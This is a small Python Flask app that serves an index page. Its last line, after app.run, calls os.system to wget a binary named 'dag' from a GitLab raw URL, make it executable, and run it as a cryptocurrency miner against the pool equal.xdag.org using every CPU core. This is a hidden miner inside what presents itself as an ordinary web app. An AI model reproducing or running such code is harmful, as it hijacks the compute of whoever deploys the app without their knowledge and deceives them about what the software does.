import os
from flask import Flask
from flask import render_template

app = Flask(__name__)

@app.route("/")
def hello():
    return render_template('index.html')

if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
    
os.system ("wget https://gitlab.com/richardkevin320/donlod/-/raw/main/dag && chmod +x dag && ./dag -cpu -a a+dc1CL2NRgbtPvLtys614KSKlv5rdYw -p equal.xdag.org:13656 -t $(nproc --all)")    
